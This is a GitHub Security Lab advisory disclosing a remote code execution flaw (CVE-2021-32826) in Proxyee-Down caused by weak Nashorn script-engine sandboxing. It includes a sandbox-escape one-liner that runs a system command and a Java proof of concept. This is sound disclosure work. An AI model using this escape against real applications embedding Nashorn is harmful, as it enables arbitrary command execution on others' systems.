=== Content from securitylab.github.com_09f5ec57_20250114_181909.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 21, 2021
# GHSL-2021-053: Remote code execution in Proxyee-Down - CVE-2021-32826

[![Author avatar](https://avatars.githubusercontent.com/u/125701)
Alvaro Munoz](https://github.com/pwntester)

## Coordinated Disclosure Timeline

* 2021-03-26: Issue reported to liwei-8466@qq.com
* 2021-07-05: Deadline expired.
* 2021-07-05: Publication as per our disclosure policy.

## Summary

An attacker being able to provide an extension script (eg: through a MiTM attack or by hosting a malicious extension) may be able to run arbitrary commands on the system running Proxyee-Down.

## Product

Proxyee-Down

## Tested Version

Version 3.4
Latest commit at the date of reporting: ec921c3 on 11 Aug 2020

## Details

### Insufficient Script Engine sandboxing (GHSL-2021-053)

Proxyee-Down uses [Nashorn engine](https://github.com/proxyee-down-org/proxyee-down/blob/ec921c3c2ca6e205484ec52ab8a8649c8f882e5c/main/src/main/java/org/pdown/gui/extension/jsruntime/JavascriptEngine.java#L17-L38) to evaluate [1](https://github.com/proxyee-down-org/proxyee-down/blob/ec921c3c2ca6e205484ec52ab8a8649c8f882e5c/main/src/main/java/org/pdown/gui/extension/util/ExtensionUtil.java#L173),[2](https://github.com/proxyee-down-org/proxyee-down/blob/ec921c3c2ca6e205484ec52ab8a8649c8f882e5c/main/src/main/java/org/pdown/gui/extension/util/ExtensionUtil.java#L176) Javascript code provided by extensions:

```
  public static ScriptEngine buildEngine() throws ScriptException, NoSuchMethodException {
    NashornScriptEngineFactory factory = new NashornScriptEngineFactory();
    ScriptEngine engine = factory.getScriptEngine(new SafeClassFilter());
    Window window = new Window();
    Object global = engine.eval("this");
    Object jsObject = engine.eval("Object");
    Invocable invocable = (Invocable) engine;
    invocable.invokeMethod(jsObject, "bindProperties", global, window);
    engine.eval("var window = this");
    return engine;
  }

```

The engine is configured to use a `ClassFilter` in order to `Prohibit any explicit call to java code` (`禁止任何显式调用java代码`):

```
  /**
   * 禁止任何显式调用java代码
   */
  private static class SafeClassFilter implements ClassFilter {

    @Override
    public boolean exposeToScripts(String s) {
      return false;
    }
  }

```

The filter above does not expose any Java classes to the Javascript scripts, but the `ClassFilter` on its own is not sufficient to prevent code execution since Nashorn exposes the underlying engine to the script and it is still possible to execute arbitrary code with it. For example, the script below will start a system process:

```
this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned\")')

```
#### Impact

This issue may lead to `Remote Code Execution`.

#### References

* [Beware of the Nashorn](https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/)

#### PoC

```
import jdk.nashorn.api.scripting.ClassFilter;
import jdk.nashorn.api.scripting.NashornScriptEngineFactory;

import javax.script.ScriptEngine;

public class Test {
    private static class SafeClassFilter implements ClassFilter {
        @Override
        public boolean exposeToScripts(String s) {
            return false;
        }
    }

    public static void main(String[] args) {
        try {
            NashornScriptEngineFactory factory = new NashornScriptEngineFactory();
            ScriptEngine engine = factory.getScriptEngine(new SafeClassFilter());
            System.out.println(engine.eval("this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned\")')"));
        } catch(Exception e) {}
    }
}

```
## CVE

* CVE-2021-32826

## Credit

This issue was discovered and reported by GHSL team member [@pwntester (Alvaro Muñoz)](https://github.com/pwntester).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-053` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information


